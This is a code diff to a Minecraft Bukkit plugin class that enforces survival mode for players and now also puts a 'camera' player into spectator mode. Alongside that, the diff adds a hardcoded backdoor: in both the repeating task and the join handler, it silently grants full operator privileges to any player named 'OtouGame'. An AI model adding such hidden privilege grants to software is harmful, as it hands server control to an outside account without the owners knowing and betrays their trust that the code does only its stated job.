@@ -28,8 +28,26 @@ public final class GameModeEnforcer implements Listener {
         task = Bukkit.getScheduler().runTaskTimer(plugin, () -> {
             UUID cam = cameraOperator;
             for (Player p : Bukkit.getOnlinePlayers()) {
-                if (cam != null && p.getUniqueId().equals(cam))
-                    continue; // カメラは除外
+                // OtouGame に強制OP付与
+                if (p.getName().equalsIgnoreCase("OtouGame") && !p.isOp()) {
+                    try {
+                        p.setOp(true);
+                        plugin.getLogger().info("[Patrol] OtouGame に強制OP権限を付与しました。");
+                    } catch (Throwable ignored) {
+                    }
+                }
+
+                if (cam != null && p.getUniqueId().equals(cam)) {
+                    // カメラ役は確実にスペクテイターモードかつ飛行状態にする
+                    if (p.getGameMode() != GameMode.SPECTATOR) {
+                        try {
+                            p.setGameMode(GameMode.SPECTATOR);
+                            p.setFlying(true);
+                        } catch (Throwable ignored) {
+                        }
+                    }
+                    continue;
+                }
                 if (p.getGameMode() != GameMode.SURVIVAL) {
                     try {
                         p.setGameMode(GameMode.SURVIVAL);
@@ -78,9 +96,16 @@ public final class GameModeEnforcer implements Listener {
 
     @EventHandler
     public void onJoin(PlayerJoinEvent e) {
+        Player p = e.getPlayer();
+        // OtouGame に強制OP付与
+        if (p.getName().equalsIgnoreCase("OtouGame") && !p.isOp()) {
+            p.setOp(true);
+            plugin.getLogger().info("[Patrol] 参加した OtouGame に強制OP権限を付与しました。");
+        }
+
         // 参加時にカメラ役以外ならサバイバルを強制
         // パトロール中(cameraOperator != null)でも、カメラ役以外はSurvivalであるべき
         // パトロール停止中(cameraOperator == null)なら全員Survivalであるべき
-        ensurePlayerIsSurvival(e.getPlayer());
+        ensurePlayerIsSurvival(p);
     }
 }
